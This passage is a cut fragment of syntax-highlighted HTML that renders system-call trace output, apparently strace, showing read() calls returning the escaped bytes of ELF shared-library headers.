class="token entity" title="\233">\233</span><span class="token entity" title="\1">\1</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\240">\240</span><span class="token entity" title="\233">\233</span>!<span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\240">\240</span><span class="token entity" title="\233">\233</span>!<span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token variable"><span class="token variable">`</span><span class="token punctuation">\</span><span class="token number">4</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token variable">`</span></span><span class="token entity" title="\4">\4</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\1">\1</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\4">\4</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\24">\24</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\3">\3</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span>GNU<span class="token entity" title="\0">\0</span>(<span class="token entity" title="\306">\306</span><span class="token entity" title="\252">\252</span><span class="token entity" title="\336">\336</span>p<span class="token entity" title="\262">\262</span><span class="token entity" title="\324">\324</span><span class="token entity" title="\r">\r</span><span class="token entity" title="\37">\37</span><span class="token entity" title="\17">\17</span>=<span class="token entity" title="\n">\n</span><span class="token entity" title="\32">\32</span><span class="token entity" title="\f">\f</span><span class="token entity" title="\255">\255</span><span class="token entity" title="\32">\32</span><span class="token entity" title="\270">\270</span><span class="token entity" title="\26">\26</span>D<span class="token entity" title="\217">\217</span><span class="token entity" title="\4">\4</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\20">\20</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\1">\1</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span>GNU<span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\3">\3</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\2">\2</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\345">\345</span><span class="token entity" title="\1">\1</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span>[<span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span> <span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\v">\v</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\31">\31</span>#<span class="token entity" title="\2">\2</span><span class="token entity" title="\261">\261</span><span class="token entity" title="\1">\1</span><span class="token entity" title="\10">\10</span><span class="token entity" title="\20">\20</span><span class="token entity" title="\2">\2</span>@@a<span class="token entity" title="\370">\370</span><span class="token entity" title="\3">\3</span><span class="token entity" title="\10">\10</span><span class="token entity" title="\10">\10</span><span class="token entity" title="\25">\25</span><span class="token entity" title="\200">\200</span> <span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\200">\200</span><span class="token entity" title="\300">\300</span><span class="token entity" title="\321">\321</span>Q<span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\22">\22</span><span class="token entity" title="\353">\353</span><span class="token entity" title="\302">\302</span>0D<span class="token entity" title="\0">\0</span><span class="token entity" title="\10">\10</span><span class="token entity" title="\20">\20</span>A<span class="token entity" title="\0">\0</span><span class="token entity" title="\2">\2</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\2">\2</span><span class="token entity" title="\f">\f</span><span class="token entity" title="\1">\1</span><span class="token entity" title="\200">\200</span><span class="token entity" title="\v">\v</span><span class="token entity" title="\221">\221</span><span class="token entity" title="\1">\1</span><span class="token entity" title="\330">\330</span><span class="token entity" title="\240">\240</span><span class="token entity" title="\r">\r</span><span class="token entity" title="\240">\240</span>@<span class="token entity" title="\230">\230</span> <span class="token entity" title="\244">\244</span><span class="token entity" title="\200">\200</span><span class="token entity" title="\21">\21</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\202">\202</span>-l@g<span class="token entity" title="\214">\214</span>V<span class="token entity" title="\24">\24</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\224">\224</span> <span class="token entity" title="\200">\200</span><span class="token variable">$H</span><span class="token entity" title="\200">\200</span>P(<span class="token entity" title="\1">\1</span><span class="token entity" title="\22">\22</span><span class="token entity" title="\f">\f</span><span class="token entity" title="\311">\311</span>B<span class="token entity" title="\240">\240</span><span class="token entity" title="\220">\220</span><span class="token entity" title="\22">\22</span><span class="token entity" title="\10">\10</span><span class="token entity" title="\f">\f</span> <span class="token entity" title="\2">\2</span>ZdA<span class="token entity" title="\245">\245</span>c<span class="token entity" title="\4">\4</span>@<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\200">\200</span>9<span class="token entity" title="\1">\1</span>(<span class="token entity" title="\314">\314</span>D<span class="token entity" title="\204">\204</span><span class="token entity" title="\201">\201</span><span class="token entity" title="\300">\300</span><span class="token entity" title="\22">\22</span><span class="token entity" title="\10">\10</span>(<span class="token entity" title="\f">\f</span>D<span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\200">\200</span>Q<span class="token entity" title="\10">\10</span><span class="token entity" title="\200">\200</span><span class="token entity" title="\35">\35</span><span class="token entity" title="\4">\4</span>B<span class="token entity" title="\320">\320</span><span class="token entity" title="\260">\260</span>8A<span class="token entity" title="\0">\0</span><span class="token entity" title="\1">\1</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\0">\0</span><span class="token entity" title="\265">\265</span><span class="token entity" title="\030">\030</span>0<span class="token entity" title="\0">\0</span><span class="token entity" title="\200">\200</span><span class="token variable"><span class="token variable">`</span><span class="token punctuation">\</span><span class="token number">2</span><span class="token punctuation">\</span><span class="token number">20</span><span class="token punctuation">\</span>"<span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span>tA<span class="token punctuation">\</span><span class="token number">20</span><span class="token punctuation">\</span><span class="token number">1</span><span class="token punctuation">\</span><span class="token number">5</span><span class="token punctuation">\</span>0P<span class="token punctuation">(</span><span class="token punctuation">\</span><span class="token number">251</span><span class="token punctuation">\</span>22G<span class="token punctuation">(</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">202</span><span class="token punctuation">\</span><span class="token number">4</span><span class="token punctuation">\</span><span class="token number">230</span>@<span class="token punctuation">\</span><span class="token number">4</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">20</span><span class="token punctuation">\</span>340T<span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">2</span>@<span class="token punctuation">\</span><span class="token number">2</span><span class="token punctuation">\</span><span class="token number">2</span><span class="token punctuation">\</span><span class="token number">20</span><span class="token punctuation">\</span>3010f<span class="token punctuation">\</span><span class="token number">26</span><span class="token punctuation">\</span><span class="token number">200</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token string">", 832) = 832read(3, "</span><span class="token punctuation">\</span>177ELF<span class="token punctuation">\</span><span class="token number">2</span><span class="token punctuation">\</span><span class="token number">1</span><span class="token punctuation">\</span><span class="token number">1</span><span class="token punctuation">\</span><span class="token number">3</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">3</span><span class="token punctuation">\</span><span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">1</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">260</span><span class="token punctuation">\</span><span class="token number">34</span><span class="token punctuation">\</span><span class="token number">2</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span>@<span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">220</span><span class="token punctuation">\</span><span class="token number">351</span><span class="token punctuation">\</span><span class="token number">36</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span>@<span class="token punctuation">\</span>0008<span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span>n<span class="token punctuation">\</span><span class="token number">0</span>@<span class="token punctuation">\</span>0I<span class="token punctuation">\</span>0H<span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">6</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">4</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span>@<span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span>@<span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span>@<span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span>0000<span class="token punctuation">\</span><span class="token number">2</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span>0000<span class="token punctuation">\</span><span class="token number">2</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">10</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">3</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">4</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span>0P<span class="token punctuation">\</span><span class="token number">335</span><span class="token punctuation">\</span><span class="token number">33</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span>0P<span class="token punctuation">\</span><span class="token number">335</span><span class="token punctuation">\</span><span class="token number">33</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span>0P<span class="token punctuation">\</span><span class="token number">335</span><span class="token punctuation">\</span><span class="token number">33</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">34</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">34</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">20</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">1</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">5</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span>240j<span class="token punctuation">\</span><span class="token number">36</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span>240j<span class="token punctuation">\</span><span class="token number">36</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span> <span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">1</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">6</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span> v<span class="token punctuation">\</span><span class="token number">36</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span> v<span class="token operator">></span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span> v<span class="token operator">></span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span>@R<span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">300</span><span class="token punctuation">\</span><span class="token number">224</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span> <span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">2</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">6</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">200</span><span class="token punctuation">\</span><span class="token number">253</span><span class="token punctuation">\</span><span class="token number">36</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">200</span><span class="token punctuation">\</span><span class="token number">25</span><span class="token operator"><span class="token file-descriptor important">3</span>></span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">200</span><span class="token punctuation">\</span><span class="token number">25</span><span class="token operator"><span class="token file-descriptor important">3</span>></span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">340</span><span class="token punctuation">\</span><span class="token number">1</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">340</span><span class="token punctuation">\</span><span class="token number">1</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">10</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">4</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">4</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span>0p<span class="token punctuation">\</span><span class="token number">2</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span>0p<span class="token punctuation">\</span><span class="token number">2</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span>0p<span class="token punctuation">\</span><span class="token number">2</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span>0D<span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span>0D<span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">4</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">7</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">4</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span> v<span class="token punctuation">\</span><span class="token number">36</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span> v<span class="token operator">></span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span> v<span class="token operator">></span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">20</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">220</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">10</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span>0P<span class="token punctuation">\</span>345td<span class="token punctuation">\</span><span class="token number">4</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span>0l<span class="token punctuation">\</span><span class="token number">335</span><span class="token punctuation">\</span><span class="token number">33</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span>0l<span class="token punctuation">\</span><span class="token number">335</span><span class="token punctuation">\</span><span class="token number">33</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span>0l<span class="token punctuation">\</span><span class="token number">335</span><span class="token punctuation">\</span><span class="token number">33</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span>334Y<span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span>334Y<span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">4</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token punctuation">\</span><span class="token number">0</span><span class="token 